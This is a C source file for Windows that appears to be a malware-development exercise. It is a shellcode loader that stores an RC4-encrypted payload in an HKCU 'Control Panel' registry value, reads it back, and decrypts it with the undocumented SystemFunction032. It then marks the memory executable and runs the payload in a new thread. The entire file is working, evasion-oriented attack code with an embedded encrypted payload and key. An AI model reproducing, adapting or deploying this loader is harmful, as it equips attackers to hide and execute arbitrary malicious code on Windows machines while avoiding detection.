#include <Windows.h>
#include <stdio.h>

#define PathReg "Control Panel" 
#define namepayload "MALWARE"


typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

unsigned char Rc4CipherText[] = {
        0x60, 0x1B, 0x76, 0x4F, 0xB4, 0x63, 0x1E, 0x67, 0x12, 0xC3, 0x5E, 0xDB, 0xD2, 0xC2, 0xE6, 0xF0,
        0x35, 0x75, 0x6E, 0x54, 0xB2, 0x57, 0x43, 0x81, 0x6C, 0xCD, 0x97, 0x2E, 0x5C, 0x72, 0x6D, 0xE2,
        0xE9, 0x82, 0xAB, 0xFE, 0x30, 0x84, 0x43, 0x37, 0xFF, 0x6E, 0xE9, 0xC5, 0x05, 0x3B, 0x5A, 0xF8,
        0xD3, 0xB9, 0x53, 0xB2, 0x5E, 0x34, 0x8C, 0xBB, 0xD9, 0xFB, 0xE4, 0xD5, 0x74, 0xF1, 0xE0, 0xCE,
        0x59, 0x43, 0x77, 0x56, 0x4C, 0xF8, 0x3B, 0x21, 0x37, 0x10, 0x39, 0x74, 0xCF, 0x0B, 0xF1, 0x7E,
        0x6F, 0x1B, 0x76, 0x55, 0x8D, 0x25, 0xBF, 0x8C, 0x8D, 0x33, 0x52, 0xC6, 0x7C, 0x64, 0xEE, 0x2C,
        0xE7, 0x06, 0x32, 0xA1, 0x24, 0x00, 0xCB, 0xCE, 0x8F, 0x38, 0x47, 0x7F, 0xD8, 0x00, 0x38, 0xCA,
        0x29, 0x7C, 0x45, 0x04, 0xA3, 0x50, 0xA8, 0x54, 0xCD, 0x40, 0x67, 0x01, 0xD6, 0x60, 0x80, 0xE3,
        0xA0, 0x30, 0x63, 0x6E, 0xDF, 0xA3, 0xD7, 0x34, 0x21, 0xC4, 0x87, 0x61, 0xD7, 0xEC, 0x01, 0xAC,
        0x02, 0xE8, 0xB2, 0x21, 0x75, 0xB3, 0x05, 0xD6, 0xE9, 0x1A, 0x5C, 0x44, 0x65, 0x0D, 0x91, 0x5B,
        0x81, 0xE2, 0x62, 0x66, 0x7C, 0xEF, 0x51, 0xE0, 0xF6, 0xE8, 0xE2, 0xB5, 0x21, 0x58, 0xCE, 0x36,
        0x39, 0xD3, 0x29, 0xF9, 0x7C, 0x58, 0xB6, 0x8C, 0x9A, 0x52, 0xC9, 0x99, 0xCE, 0xAF, 0xB5, 0x8F,
        0x0D, 0xBB, 0x4A, 0xD5, 0xA1, 0x00, 0x18, 0x2A, 0xDE, 0x28, 0x20, 0xD2, 0xA1, 0x2C, 0x1B, 0x36,
        0x9E, 0x15, 0xA3, 0xD9, 0x60, 0x6D, 0x8E, 0x78, 0xDF, 0xA6, 0xF2, 0xD5, 0x52, 0xC7, 0x7E, 0x25,
        0x54, 0x78, 0xCC, 0x94, 0x79, 0x28, 0x15, 0xD1, 0x35, 0xAB, 0x13, 0xD9, 0xAE, 0x86, 0x88, 0xD0,
        0x9D, 0xF7, 0xB6, 0xAC, 0x18, 0x02, 0xCD, 0x4F, 0xF6, 0x29, 0x24, 0x5C, 0xE1, 0x70, 0xD8, 0x91,
        0x7D, 0xC8, 0xE3, 0xCB, 0x0B, 0x98, 0xAF, 0x17, 0xF3, 0x07, 0x36, 0x13, 0x7A, 0xDC, 0x9A, 0xCC,
        0x5F, 0x41, 0xDE, 0xDF };


unsigned char Rc4Key[] = {
        0x80, 0xC5, 0xB6, 0x91, 0x2A, 0x54, 0xA5, 0x34, 0x35, 0x98, 0xEA, 0x74, 0x84, 0xB8, 0x9E, 0x59 };



BOOL WriteShellcodetoReg(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {
    // hkey
    HKEY hKey = NULL;
    // A value that you can enter with the function
    LSTATUS STATUS = NULL;
    // bSTATE for TRUE or FALSE With Function
    BOOL bSTATE = TRUE;
                                                         //here this value for print the size the value
    printf("[i] Writing 0x%p [ Size: %ld ] to \"s\\%s\" ... ", pShellcode, dwShellcodeSize, PathReg, namepayload);


    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, PathReg, 0, KEY_SET_VALUE, &hKey);
    if (STATUS != ERROR_SUCCESS) {

        printf("[i] RegOpenKeyExA Failed With Error : %d \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, namepayload, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (STATUS != ERROR_SUCCESS) {
        printf("[i] RegSetValueExA Failed With Error : %d \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");

_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);


    return bSTATE;
}

BOOL readpayloadreg(OUT PBYTE* ppPayload, OUT SIZE_T* pssIzepayload) {

    LSTATUS STATUS = NULL;
    DWORD dwBytesRead = NULL;
    PVOID pBytes = NULL;

    STATUS = RegGetValueA(HKEY_CURRENT_USER, PathReg, namepayload, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
    if (STATUS != ERROR_SUCCESS) {
        printf("[!] RegGetValueA with Error : %d \n", STATUS);
        return FALSE;

    }

    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
    if (pBytes == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    STATUS = RegGetValueA(HKEY_CURRENT_USER, PathReg, namepayload, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (STATUS != ERROR_SUCCESS) {
        printf("[!] RegGetValueA with Error : %d \n", STATUS);
        return FALSE;

    }

    *ppPayload = pBytes;
    *pssIzepayload = dwBytesRead;

    return TRUE;

}

BOOL executeshellcode(IN PVOID pShellcodeDecrpt, IN SIZE_T sSizeDecrptShellcode) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldRule = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sSizeDecrptShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pShellcodeDecrpt, sSizeDecrptShellcode);
    memset(pShellcodeDecrpt, '\0', sSizeDecrptShellcode);

    if (!VirtualProtect(pShellcodeAddress, sSizeDecrptShellcode, PAGE_EXECUTE_READWRITE, &dwOldRule)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;

    }

    printf("[#] Press <Enter> To Run ...");
    getchar();

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[i] CreateThread Failed With Error : %d \n", GetLastError());

        return FALSE;
    }

    return TRUE;
}

int main() {

    PVOID pBytes = NULL;
    SIZE_T sSize = NULL;

    printf("[i] Reading Shellcode ...");
    if (!readpayloadreg(&pBytes, &sSize)) {
        return -1;
    }
    printf("[+] DONE \n");
    printf("[+] Payload Of Size [%d] Read At : 0x%p \n", sSize, pBytes);

    printf("[#] Press <Enter> To Decrypt The Shellcode ...");
    getchar();
    printf("Decrpting Shellcode ...");

    if (!Rc4EncryptionViSystemFunc032(Rc4Key, pBytes, sizeof(Rc4Key), sSize)) {
        return -1;
    }
    printf("[+] DONE \n");

    if (!executeshellcode(pBytes, sSize)) {
        return -1;
    }
    HeapFree(GetProcessHeap(), 0, pBytes);

    printf("[#] Press <Enter> To Quit ...");
    getchar();

    return 0;



}
